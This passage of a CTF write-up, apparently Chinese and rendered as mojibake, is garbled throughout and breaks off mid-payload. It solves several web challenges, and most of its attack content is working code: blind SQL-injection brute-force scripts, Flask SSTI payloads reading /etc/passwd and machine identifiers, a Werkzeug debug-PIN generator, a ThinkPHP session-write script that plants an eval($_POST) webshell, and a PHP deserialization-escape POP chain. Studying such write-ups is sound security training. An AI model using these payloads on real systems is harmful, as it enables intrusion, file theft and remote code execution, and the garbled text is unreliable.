å‘ç°ï¼Œè¿™é‡Œåˆ©ç”¨äº†PDOæ¥å£è¿›è¡Œä¸æ•°æ®åº“çš„é“¾æ¥ï¼Œå…¶ä¸­prepareå°±æ˜¯å‡†å¤‡äº†ä¸€ä¸ªé¢„å¤„ç†è¯­å¥ï¼Œ$row-&gt;bindParam(1,$id);ä¸­çš„binParamä½œç”¨æ˜¯ç»‘å®šä¸€ä¸ªå‚æ•°åˆ°æŒ‡å®šçš„å˜é‡åã€‚è¯·æ•™åˆ«çš„å¸ˆå‚…äº†è§£åˆ°PDOä¸­å•å¼•å·å¯èƒ½æ˜¯è¢«è‡ªåŠ¨è¿‡æ»¤çš„ï¼Œé‚£å°±åªå¥½åˆ©ç”¨å®½å­—èŠ‚ç»•è¿‡ï¼š%df%27ï¼Œæºç é‡Œåˆ©ç”¨äº†é¢„å¤„ç†è¯­å¥ï¼Œæ³¨å…¥çš„æ—¶å€™ä¹Ÿå°±é€‰æ‹©äº†åˆ©ç”¨é¢„å¤„ç†è¯­å¥è¿›è¡Œæ³¨å…¥ï¼ŒåŒæ—¶ç»“åˆ16è¿›åˆ¶ç¼–ç ç»•è¿‡å¯¹å…³é”®å­—çš„è¿‡æ»¤ã€‚ è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š import requestsimport timedef main(): url = 'http://96e2f11ccc1147559b9e8c7c9991e494c4dd1d4ca36f4428.changame.ichunqiu.com/?id=1%df%27;' payloads = \"set @a=0x{0};prepare ctftest from @a; execute ctftest;\" flag = '' letter = 'abcdefghijklmnopqrstuvwxyz0123456789{}-' for m in range(1, 80): print(\"å‰{0}ä½\".format(m)) payload = \"select if (ascii(mid((select fllllll4g from table1 ),{0},1))={1}, sleep(3), 1)\" # ç”±äºæˆ‘ä»¬ä¼šè½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œæ‰€ä»¥ä¸å­˜åœ¨ä»»ä½•è¿‡æ»¤ï¼Œå…³é”®è¯éšä¾¿ä½¿ç”¨ for n in letter: # print(payload.format(m, n)) xxx = url + payloads.format(str_to_hex(payload.format(m, ord(n)))) # print(xxx) times = time.time() res = requests.post(xxx) if time.time() - times &gt;= 2: flag += n print(flag) breakdef str_to_hex(s): return ''.join([hex(ord(c)).replace('0x', '') for c in s]) # å­—ç¬¦ä¸²è½¬æ¢ä¸º16è¿›åˆ¶çš„å‡½æ•°if __name__ == '__main__': main() Web-Easqliè€ƒå¯Ÿç›²æ³¨ï¼Œè¿™é¢˜ä¹Ÿå­¦åˆ°äº†æ–°å§¿åŠ¿ï¼šåœ¨union selectè¢«bançš„æƒ…å†µä¸‹ï¼Œè¿›è¡Œå¤šåˆ—æ•°æ®çš„çˆ†ç ´ã€‚ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®æ˜¯ä¸€ä¸ªå¤§å¤§çš„è¾“å…¥æ¡†ï¼Œå¤šæ¬¡å°è¯•å‘ç°è¾“å…¥1çš„æ—¶å€™å›æ˜¾Hello Nu1Lï¼Œè¾“å…¥0çš„æ—¶å€™å›æ˜¾helloï¼Œåæ¥æµ‹è¯•äº†å¤šä¸ªå…³é”®å­—ï¼Œå‘ç°union selectå•ç”¨çš„æ—¶å€™æ²¡é—®é¢˜ï¼Œè”åˆèµ·æ¥ä½¿ç”¨æ€ä¹ˆéƒ½ç»•ä¸è¿‡ï¼Œorã€andä¹Ÿè¢«banäº†ï¼Œä½†æ˜¯&amp;&amp;æ²¡è¢«banï¼Œè¿™é‡Œæœ‰æå¤´ï¼Œç„¶åæµ‹äº†ä¸€ä¸‹ï¼Œè¯­å¥ä¸ºtrueå›æ˜¾ä¹Ÿæ˜¯hello Nu1Lï¼Œå°±ä»è¿™é‡Œä¸‹æ‰‹äº†ã€‚åæ¥åˆå‘ç°information_schemaä¹Ÿè¢«banäº†ï¼Œè¿™æ—¶å€™æƒ³åˆ°äº†ä¹‹å‰ä¸€ä¸ªé¢˜é‡Œè®²è¿‡çš„ï¼šåˆ©ç”¨mysqlç³»ç»Ÿåº“sys.schema_table_statistics_with_bufferæˆ–è€…sys.schema_auto_increment_columnsè·å–åˆ°äº†è¡¨åï¼Œä½†æ˜¯å› ä¸ºunion selectè¢«banï¼Œæ— åˆ—åæ³¨å…¥ä¹Ÿæ²¡æ³•è¿›è¡Œï¼Œè¿™æ—¶å€™å°±ç”¨åˆ°äº†å‰é¢è¯´çš„å­¦åˆ°çš„æ–°å§¿åŠ¿äº†ï¼šåˆ©ç”¨id=2-(select (select 1,{0})&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))&quot;è¿™æ ·çš„è¯­å¥ä½¿è¿›è¡Œä¸¤åˆ—çš„å¯¹æ¯”ï¼Œä»è€Œçˆ†ç ´å‡ºç¬¬äºŒåˆ—(flagåˆ—)çš„å†…å®¹ã€‚è„šæœ¬å¦‚ä¸‹ï¼š è§£é¢˜è„šæœ¬import requestsurl = 'http://ab8f8551f4dc43a4bc43854950cb1088190a260570ee455c.changame.ichunqiu.com/index.php'headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"}# payload = \"1 &amp;&amp; mid((select database()),1,{0})='{1}'\"# payload = \"1 &amp;&amp; mid((select table_name from sys.schema_table_statistics_with_buffer where table_schema='ctf' limit 1 offset 1),1,{0})='{1}'\"# payload = \"1 &amp;&amp; mid((select column_name from sys.schema_auto_increment_columns where table_name='f1ag_1s_h3r3_hhhhh' limit 1),1,{0})='{1}'\" #ä¸å¯ç”¨ï¼Œéœ€è¦è¿›è¡Œæ— åˆ—åæŸ¥è¯¢# payload = \"1 &amp;&amp; mid((select * from f1ag_1s_h3r3_hhhhh limit 1),1,{0})='{1}'\" #ä¸å¯ç”¨ï¼Œå› ä¸ºæœ‰ä¸¤åˆ—database = ''letter = '0123456789bcdehijkmnopqrstuvwxyz_-{}''''for i in range(1, 80): for n in letter: data = { \"id\": payload.format(i, database + n), } req = requests.post(url, data=data,headers=headers) # print(req.text.encode('gbk').decode(req.apparent_encoding)) if \"Hello Nu1L\" in req.text: print(n) flag += n print(database) break'''flag=''while 1: for i in range(32,126): a = chr(i).encode().hex() payload = \"id=2-(select (select 1,0x%s)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))\"%(flag.encode().hex()+a) #åˆ›å»ºä¸¤åˆ—æ•°æ®å»æ¯”è¾ƒ #print(\"Test:\"+chr(i)) html = requests.post(url=url,data=payload,headers=headers) if \"Hello Nu1L\" in html.text: flag += chr(i-1) print(\"Find:\"+flag) break if chr(i) == '}': flag +='}' breakprint(flag) Web-FlaskAppè€ƒå¯ŸSSTI é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®å‘ç°æ˜¯ä¸€ä¸ªbase64åŠ å¯†è§£å¯†ç½‘ç«™ï¼Œç›´æ¥è€ƒè™‘SSTIäº†ã€‚å¹¶ä¸”è¿™ä¸ªé¢˜è·Ÿå¦å¤–ä¸€ä¸ªåˆ©ç”¨Flaskå†™çš„åŠ å¯†çš„é¢˜å¾ˆåƒï¼Œä¾¿å‚è€ƒäº†é‚£ä¸ªé¢˜çš„è§£é¢˜æ€è·¯ï¼šåœ¨å¼€å¯DEBUGæ¨¡å¼çš„æƒ…å†µä¸‹è¿›è¡Œæ¨¡æ¿æ³¨å…¥ã€‚é¦–å…ˆæµ‹è¯•ä¸€ä¸‹SSTIæ˜¯å¦èƒ½ç”¨ï¼šå…ˆåœ¨åŠ å¯†é¡µé¢å¯¹åŠ å¯†ä¸€ä¸‹ï¼Œç„¶ååˆ°è§£å¯†é¡µè§£å¯†ï¼Œé¡µé¢å›æ˜¾å¦‚ä¸‹ï¼šç”±æ­¤å¾—çŸ¥ï¼Œç¡®å®æ˜¯SSTIï¼ŒåŒæ—¶è¿˜çœ‹åˆ°äº†å¼€å¯äº†DEBUGæ¨¡å¼ã€‚é‚£å°±åˆ©ç”¨é‚£é“é¢˜çš„è§£é¢˜æ€è·¯å»åšå§ã€‚ è§£é¢˜å‚è€ƒå‰é¢çš„é“¾æ¥æˆ‘ä»¬çŸ¥é“ï¼Œè¿™é“é¢˜å¯ä»¥é€šè¿‡è®¡ç®—å‡ºPINæ¥ç™»å½•æ§åˆ¶å°ï¼Œç„¶ååœ¨æ§åˆ¶å°è¿›è¡Œæ“ä½œæ‹¿flagã€‚ä½†æ˜¯ç”ŸæˆPINçš„è„šæœ¬éœ€è¦çŸ¥é“username(è¿™ä¸ªéœ€è¦æˆ‘ä»¬è‡ªå·±å»æ‰¾)ã€modname(ä¸€èˆ¬æ˜¯flask.app)ã€ç¬¬ä¸‰ä¸ªå€¼getattr(app, &quot;__name__&quot;, app.__class__.__name__)(ä¸€èˆ¬æ˜¯Flask)ã€ç¬¬å››ä¸ªå€¼getattr(mod, &quot;__file__&quot;, None)(åœ¨æŠ¥é”™é¡µé¢å¯ä»¥çœ‹åˆ°é¢˜ç›®çš„ç¯å¢ƒ)ã€ç¬¬äº”ä¸ªæ˜¯str(uuid.getnode())çš„å€¼ï¼Œæœ€åæ˜¯æœºå™¨ç ã€‚æŠ¥é”™é¡µé¢å›æ˜¾å¦‚ä¸‹ï¼š è·å–usernameå¯ä»¥åœ¨/etc/passwdä¸­è¯»å–åˆ°ç”¨æˆ·åï¼Œè¿™é‡Œç”±äºé¢˜ç›®ç¯å¢ƒæ˜¯Python3çš„ï¼Œå› æ­¤è¯»æ–‡ä»¶éœ€è¦ç”¨å¦‚ä¸‹payloadï¼š {{ ''.__class__.__mro__[1].__subclasses__()[103].__init__.__globals__['open']('/etc/passwd').read() }} å¦‚æœç¯å¢ƒæ˜¯Python2ï¼Œpayloadå¯ä»¥æ„é€ ä¸ºï¼š {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }} è·Ÿå‰é¢çš„æ“ä½œä¸€æ ·ï¼Œå…ˆç¼–ç ï¼Œå†å»è§£ç å¼•å‘SSTIï¼Œå›æ˜¾å¦‚ä¸‹ï¼šæˆ‘ä»¬çœ‹åˆ°å¯ä»¥ç”¨æˆ·åflaskwebï¼Œåº”è¯¥å°±æ˜¯å®ƒäº†ã€‚ modenameä»¥åŠç¬¬ä¸‰ä¸ªã€ç¬¬å››ä¸ªå·²ç»çŸ¥é“äº†ï¼Œç›´æ¥å»æ‰¾str(uuid.getnode())çš„å€¼ã€‚ è·å–str(uuid.getnode())æ„é€ payloadï¼š {{ ''.__class__.__mro__[1].__subclasses__()[103].__init__.__globals__['open']('/sys/class/net/eth0/address').read()}} æŒ‰ç…§åŒæ ·çš„æ–¹æ³•è¿›è¡Œæ³¨å…¥ï¼Œå¾—åˆ°å›æ˜¾å¦‚ä¸‹ï¼šç„¶ååˆ°è¿›åˆ¶è½¬æ¢ç½‘ç«™è½¬æ¢ä¸ºåè¿›åˆ¶ã€‚ è·å–æœºå™¨ç æ„é€ payloadï¼š {{ ''.__class__.__mro__[1].__subclasses__()[103].__init__.__globals__['open']('/proc/self/cgroup').read()}} å›æ˜¾å¦‚ä¸‹ï¼šç¬¬ä¸€é¡¹/docker/åé¢çš„å­—ç¬¦ä¸²å³ä¸ºæˆ‘ä»¬è¦æ‰¾çš„æœºå™¨ç ã€‚è‡³æ­¤ï¼Œæ‹¿åˆ°äº†ç”ŸæˆPINçš„æ‰€æœ‰çš„è¦ç´ äº†ï¼Œåˆ©ç”¨ä¸‹é¢çš„è„šæœ¬ç”ŸæˆPINï¼š import hashlibfrom itertools import chainprobably_public_bits = [ 'flaskweb'# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),]private_bits = [ '2485377957890',# str(uuid.getnode()), /sys/class/net/ens33/address '3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320'# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) ç„¶ååˆ°é¢˜ç›®çš„é“¾æ¥åé¢åŠ ä¸Š/consoleè¿›å…¥æ§åˆ¶é¢æ¿ï¼Œè¾“å…¥PINï¼Œè·å–æƒé™ï¼šç„¶åå°±å¯ä»¥éšæ„è¾“å…¥è¯»å–æ–‡ä»¶æ‹¿flagäº†(æ³¨æ„åˆ—ä¸¾æ–‡ä»¶çš„æ—¶å€™ä¹Ÿå¯ä»¥ç›´æ¥åˆ—ä¸¾æ ¹ç›®å½•çš„ls /)ï¼š Web-easy_thinkingè€ƒå¯ŸThinkPHP6.0å­˜åœ¨çš„é€šè¿‡SESSIONå†™æ–‡ä»¶çš„æ¼æ´ï¼ŒåŒæ—¶ä¹Ÿè€ƒå¯Ÿäº†å¯¹disable_functionsçš„ç»•è¿‡ã€‚è¿™ä¸€é“é¢˜æ¯”èµ›çš„æ—¶å€™çŸ¥é“è€ƒå¯Ÿç‚¹æ˜¯SESSIONæ¼æ´äº†ï¼Œä½†æ˜¯ç”±äºæ—¶é—´åŸå› å½“æ—¶æ²¡æœ‰åšå‡ºæ¥ï¼Œåæ¥ç»smityå¸ˆå‚…æç¤ºï¼Œç»“åˆgetflyå¸ˆå‚…çš„é¢˜è§£ï¼Œå¯¹è¿™é“é¢˜åŠ æ·±äº†ç†è§£å’Œå­¦ä¹ ã€‚åœ¨BUUä¸Šå¤ç°äº†ä¸€ä¸‹ã€‚ é¢˜ç›®åˆ†æç”±äºç¯å¢ƒæ˜¯ThinkPHP6.0ï¼Œç½‘ä¸ŠæŸ¥äº†ä¸€ä¸‹ï¼Œæ‰¾åˆ°äº†ç›¸å…³çš„æ¼æ´æ–‡ç« ï¼šhttps://blog.csdn.net/god_zzZ/article/details/104275241https://paper.seebug.org/1114/#_1å°±æ˜¯é€šè¿‡åˆ©ç”¨SESSIONå‘æœåŠ¡å™¨å†™å…¥æ–‡ä»¶ï¼Œä»è€Œæ‹¿åˆ°shellã€‚ æ—¢ç„¶æ˜¯é€šè¿‡SESSIONå†™å…¥æ–‡ä»¶ï¼Œæˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°å­˜åœ¨SESSIONå†™å…¥çš„ä½ç½®ï¼Œåœ¨Memberæ§åˆ¶å™¨ä¸­å‘ç°å¦‚ä¸‹ä»£ç ï¼š if (!session('?UID')){ return redirect('/home/member/login'); }$data = input(\"post.\");$record = session(\"Record\");if (!session(\"Record\")){ session(\"Record\",$data[\"key\"]);} å¯ä»¥çœ‹åˆ°ï¼Œåœ¨searchæ–¹æ³•ä¸­å¯ä»¥è¿›è¡Œä»»æ„SESSIONå†™å…¥ï¼Œåœ¨è¿™ä¸ªåœ°æ–¹æˆ‘ä»¬å°±å¯ä»¥å†™å…¥æ„é€ å¥½çš„å†…å®¹æ¥ç”Ÿæˆshellï¼Œä½†æ˜¯é¦–å…ˆå°±éœ€è¦æ»¡è¶³ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œå³éœ€è¦ä¸€ä¸ªç°æœ‰çš„SESSIONæ–‡ä»¶å¹¶ä¸”åŒ…å«UIDå­—æ®µï¼Œä¸‹é¢å°±éœ€è¦æ‰¾åˆ°å°†UIDå†™å…¥SESSIONçš„åœ°æ–¹ã€‚åœ¨Memberæ§åˆ¶å™¨çš„loginæ–¹æ³•ä¸­æ‰¾åˆ°å¦‚ä¸‹ä»£ç ï¼š if ($userId){ session(\"UID\",$userId); return redirect(\"/home/member/index\");} å°†UIDå†™å…¥SESSIONçš„æ“ä½œæ˜¯åœ¨åˆ¤æ–­ç”¨æˆ·åå’Œå¯†ç æ­£ç¡®ä¹‹åçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦å…ˆæ³¨å†Œä¸€ä¸ªåˆæ³•çš„ç”¨æˆ·è¿›è¡Œç™»å½•ã€‚ æ‹ä¸€ä¸‹æ•´ä¸ªçš„æ€è·¯ï¼š 1ã€æ³¨å†Œä¸€ä¸ªåˆæ³•è´¦æˆ· 2ã€åˆ©ç”¨æ³¨å†Œçš„è´¦æˆ·ç™»å½•æ—¶æ›´æ”¹SESSIONå­—æ®µçš„å€¼ä¸ºxxx.phpï¼Œå¹¶ä¸”åˆšå¥½æ˜¯32ä¸ªå­—ç¬¦ 3ã€åˆ©ç”¨ç›¸åŒçš„SESSIONåœ¨æœç´¢çš„æ—¶å€™å†™å…¥ä¸€å¥è¯ 4ã€åœ¨/runtime/sessionæ–‡ä»¶å¤¹ä¸‹æµ‹è¯•ä¸€å¥è¯ï¼Œæ³¨æ„æ˜¯sess_å¼€å¤´çš„ å‚è€ƒgetflyå¸ˆå‚…çš„è„šæœ¬ï¼š import requestsurl_reg = 'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/register'url_log = 'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/login'url_sea = 'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/search'headers = { 'Cookie':'PHPSESSID=1234567890123456789012345678.php' }data1 = {'username':'ggb0n', 'password':'123456'}data2 = {'key':'&lt;?php @eval($_POST[\"x\"]);echo \"not flag\"; ?&gt;'}s1 = requests.post(url_reg, data1)s2 = requests.post(url_log, data1, headers=headers)s3 = requests.post(url_sea, data2, headers=headers)test = 'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/runtime/session/sess_1234567890123456789012345678.php's = requests.get(test).textif 'not flag' in s: print('success')else: print('failed') èšå‰‘è¿æ¥å°é©¬ä¹‹ååœ¨ç»ˆç«¯è¿è¡Œ/readflagæ˜¯æ²¡ç”¨çš„ï¼Œåˆ©ç”¨phpinfo()å‘ç°æ˜¯å› ä¸ºdisable_functionsæŠŠsystemç»™banæ‰äº†ï¼šé‚£å°±éœ€è¦ç»•è¿‡é™åˆ¶ï¼Œsmityå¸ˆå‚…æ¯”èµ›çš„æ—¶å€™å°±æé†’éœ€è¦ç”¨php_gc_uaf.phpæ¥ç»•è¿‡disable_functhionsï¼Œä¸€äº›ç»•è¿‡æ–¹æ³•å‚è€ƒè¿™é‡Œã€‚æŠŠphp_gc_uaf.phpä¼ åˆ°ä¸€ä¸ª777æƒé™çš„æ–‡ä»¶å¤¹ä¸‹ï¼Œç„¶ååœ¨æµè§ˆå™¨ç«¯è®¿é—®è¯¥æ–‡ä»¶å³å¯æ‹¿åˆ°flagã€‚ ã€è¡¥å……ã€‘è¿™ä¸ªexpä¸ç”¨777æƒé™çš„æ–‡ä»¶å¤¹å°±èƒ½æ‰§è¡Œï¼Œwebç›®å½•å³å¯ã€‚é«˜æ ¡æˆ˜â€œç–«â€ä¸­çš„PHP-UAFå°±æ˜¯ç”¨çš„è¿™ä¸ªã€‚ babyPHPè€ƒå¯Ÿååºåˆ—åŒ–é€ƒé€¸æ¼æ´ï¼Œè¿™ä¸ªä¹‹å‰åœ¨BUUä¸Šåˆ·äº†ä¸€é“ç±»ä¼¼çš„é¢˜ç›®ï¼Œä¸è¿‡æ›´åŠ å¤æ‚ï¼Œæ¯”èµ›çš„æ—¶å€™æ²¡åšå‡ºæ¥ï¼Œçœ‹äº†WPè®°å½•å­¦ä¹ ä¸€ä¸‹ã€‚ é¢˜ç›®åˆ†ææ‰«æåå°å¯ä»¥å‘ç°å­˜åœ¨æºç www.zipï¼Œä¸‹è½½åæ˜¯å››ä¸ªphpæ–‡ä»¶ï¼Œæˆ‘ä»¬ä¸»è¦åˆ†æä¸æ‹¿flagç›¸å…³çš„ä»£ç ã€‚é¦–å…ˆä»update.phpä¸­å‘ç°ï¼š if($_SESSION['login']===1){ require_once(\"flag.php\"); echo $flag;} å¯ä»¥å‘ç°ï¼Œç™»é™†æˆåŠŸä¹‹åå°±å¯ä»¥æ‹¿åˆ°flagäº†ã€‚ ç„¶åå®¡è®¡å…³é”®æ–‡ä»¶lib.phpï¼Œåœ¨å…¶ä¸­å‘ç°å¦‚ä¸‹ä»£ç ï¼š function safe($parm){ $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\"); return str_replace($array,'hacker',$parm);} çœ‹åˆ°è¿™é‡Œï¼Œå°±æƒ³åˆ°äº†ä¹‹å‰åœ¨BUUä¸Šåˆ·çš„[0CTF 2016]piapiapiaï¼Œé‚£é“é¢˜è€ƒå¯Ÿçš„å°±æ˜¯ååºåˆ—åŒ–æº¢å‡ºæ¼æ´ï¼Œè¿™ä¹Ÿå°±æ˜¯åˆ†æçš„å…³é”®äº†ã€‚å†å¾€ä¸‹çœ‹ï¼Œåœ¨UpdateHelperç±»ä¸­æœ‰ä¸€ä¸ªååºåˆ—åŒ–ç‚¹ï¼š Class UpdateHelper{ public $id; public $newinfo; public $sql; public function __construct($newInfo,$sql){ $newInfo=unserialize($newInfo); $upDate=new dbCtrl(); } public function __destruct() { echo $this-&gt;sql; }} ä½†æ˜¯ä»ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œæ­¤å¤„ç”¨æˆ·å¯æ§çš„åªæœ‰Infoç±»ä¸­çš„ä¸¤ä¸ªå±æ€§ageã€nicknameï¼Œä¸èƒ½å®Œå…¨æ§åˆ¶åºåˆ—åŒ–æ•°æ®ï¼Œæ— æ³•æ³¨å…¥å¯¹è±¡ã€‚è·Ÿè¿›Userç±»ä¸­çš„ååºåˆ—åŒ–ç‚¹ï¼š public function update(){ $Info=unserialize($this-&gt;getNewinfo()); $age=$Info-&gt;age; $nickname=$Info-&gt;nickname; $updateAction=new UpdateHelper($_SESSION['id'],$Info,\"update user SET age=$age,nickname=$nickname where id=\".$_SESSION['id']); //è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘} å¯ä»¥å‘ç°ï¼Œååºåˆ—åŒ–çš„æ˜¯getNewinfo()æ–¹æ³•è·å–çš„å†…å®¹ï¼Œå†æ¥çœ‹ä¸€ä¸‹getNewinfo()ï¼š public function getNewInfo(){ $age=$_POST['age']; $nickname=$_POST['nickname']; return safe(serialize(new Info($age,$nickname)));} å¯ä»¥çœ‹åˆ°ï¼Œå¯¹Infoç±»çš„å†…å®¹åºåˆ—åŒ–ä¹‹åï¼Œä¼šå…ˆç»è¿‡å‰é¢æåˆ°çš„safe()å‡½æ•°å¤„ç†ï¼Œç„¶åæ‰è¿›è¡Œååºåˆ—åŒ–ã€‚è¿™é‡Œå°±æ˜¯æ„é€ ååºåˆ—åŒ–é€ƒé€¸çš„åœ°æ–¹ï¼šé€šè¿‡å†™å…¥é»‘åå•ä¸­çš„å­—ç¬¦\\å­—ç¬¦ä¸²ï¼Œåœ¨ç»è¿‡safe()å‡½æ•°å¤„ç†çš„æ—¶å€™ä¼šæ›¿æ¢ä¸ºhackerï¼Œä»è€Œæ”¹å˜äº†é•¿åº¦ï¼Œä½†æ˜¯åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œæ¯ä¸€ä¸ªå±æ€§çš„å†…å®¹é•¿åº¦éƒ½æ˜¯å›ºå®šçš„ï¼Œä»è€Œå°±å¯ä»¥åˆ©ç”¨æ›¿æ¢å…³ç³»æ„é€ å‡ºé€ƒé€¸ï¼Œç„¶åæ³¨å…¥å¯¹è±¡ã€‚ æ•´ç†ä¸€ä¸‹æ„é€ popé“¾çš„æ€è·¯ï¼š åˆ©ç”¨UpdateHelperçš„__destructè§¦å‘Userçš„__toStringç„¶åèµ°åˆ°Infoçš„__callæ–¹æ³•ï¼Œåœ¨__callä¸­è°ƒç”¨äº†dbCtrlç±»çš„loginæ–¹æ³•ï¼Œé€šè¿‡æ§åˆ¶æŸ¥è¯¢è¯­å¥ï¼ŒæŠŠadminè´¦æˆ·çš„å¯†ç æŸ¥å‡ºæ¥ã€‚ å®˜æ–¹POCå¦‚ä¸‹ï¼š &lt;?phpclass User{ public $id; public $age=null; public $nickname=null;}class Info{ public $age; public $nickname; public $CtrlCase; public function __construct($age,$nickname){ $this-&gt;age=$age; $this-&gt;nickname=$nickname; } }class UpdateHelper{ public $id; public $newinfo; public $sql;}class dbCtrl{ public $hostname=\"127.0.0.1\"; public $dbuser=\"root\"; public $dbpass=\"root\"; public $database=\"test\"; public $name='admin'; public $password; public $mysqli; public $token;}$d = new dbCtrl();$d-&gt;token='admin';$b = new Info('','1');$b-&gt;CtrlCase=$d;$a = new user();$a-&gt;nickname=$b;$a-&gt;age=\"select password,id from user where username=?\";$c=new UpdateHelper();$c-&gt;sql=$a;echo serialize($c);?&gt; è¿è¡Œç»“æœå¦‚ä¸‹ O:12:\"UpdateHelper\":3:{s:2:\"id\";N;s:7:\"newinfo\";N;s:3:\"sql\";O:4:\"User\":3:{s:2:\"id\";N;s:3:\"age\";s:45:\"select password,id from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:{s:3:\"age\";s:0:\"\";s:8:\"nickname\";s:1:\"1\";s:8:\"CtrlCase\";O:6:\"dbCtrl\":8:{s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:4:\"test\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";N;s:6:\"mysqli\";N;s:5:\"token\";s:5:\"admin\";}}}} æˆ‘ä»¬çš„ç›®çš„æ˜¯é€ƒé€¸å­—ç¬¦ï¼Œå› æ­¤éœ€è¦ä¿è¯payloadè¿›å…¥ä¹‹åèƒ½ä¿è¯åºåˆ—åŒ–å­—ç¬¦ä¸²èƒ½å¤Ÿæ­£å¸¸ååºåˆ—åŒ–ï¼Œæ­£å¸¸çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ç»“æ„å¦‚ä¸‹ï¼š O:4:\"Info\":3:{s:3:\"age\";s:5:\"ggb0n\";s:8:\"nickname\";s:7:\"ggb0n\";s:8:\"CtrlCase\";N;} å…¶ä¸­çš„ageå’Œnicknameæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æŠŠpayloadå†™å…¥åˆ°nicknameéƒ¨åˆ†ï¼Œç„¶åé€šè¿‡å°†payloadæŒ¤å‡ºå»è¿›è¡Œé€ƒé€¸ï¼Œç”±äºå±æ€§æ˜¯ä¸‰ä¸ªï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨nicknameä¸­å†™å…¥çš„payloadå‰é¢åŠ ä¸€ä¸ªCtrlCaseçš„å±æ€§ï¼Œåœ¨æœ€ååŠ ä¸€ä¸ª}ï¼Œå¦‚æ­¤ä»¥æ¥ï¼Œååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šå¿½ç•¥åé¢çš„CtrlCaseï¼Œåˆæ­¥æ„é€ payloadå¦‚ä¸‹ï¼š \";s:8:\"CtrlCase\";O:12:\"UpdateHelper\":3:{s:2:\"id\";N;s:7:\"newinfo\";N;s:3:\"sql\";O:4:\"User\":3:{s:2:\"id\";N;s:3:\"age\";s:45:\"select password,id from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:{s:3:\"age\";s:0:\"\";s:8:\"nickname\";s:1:\"1\";s:8:\"CtrlCase\";O:6:\"dbCtrl\":8:{s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:4:\"test\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";N;s:6:\"mysqli\";N;s:5:\"token\";s:5:\"admin\";}}}}} ä¸‹ä¸€æ­¥æˆ‘ä»¬å°±éœ€è¦æŠŠpayloadé€ƒé€¸å‡ºå»ï¼šç”±äºpayloadä¸€å…±454ä¸ªå­—ç¬¦ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ é»‘åå•ä¸­çš„å†…å®¹ï¼Œé€šè¿‡æ›¿æ¢ä¸ºhackeræŠŠpayloadæŒ¤å‡ºå»ï¼Œé€šè¿‡safe()å‡½æ•°æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œä¸€ä¸ª'æ›¿æ¢ä¸ºhackerå¯ä»¥æ›¿æ¢æŒ¤å‡º5ä¸ªå­—ç¬¦ï¼Œä¸€ä¸ªunionæ›¿æ¢ä¸ºhackerå¯ä»¥æŒ¤å‡º1ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆåœ¨payloadå‰é¢åŠ ä¸Š90ä¸ª'å’Œ4ä¸ªunionå°±å¯ä»¥æŠŠ454ä¸ªå­—ç¬¦çš„payloadæŒ¤å‡ºå»äº†ï¼Œæ„é€ æœ€ç»ˆpayloadå¦‚ä¸‹ï¼š age=&amp;nickname=''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''unionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:{s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:{s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where 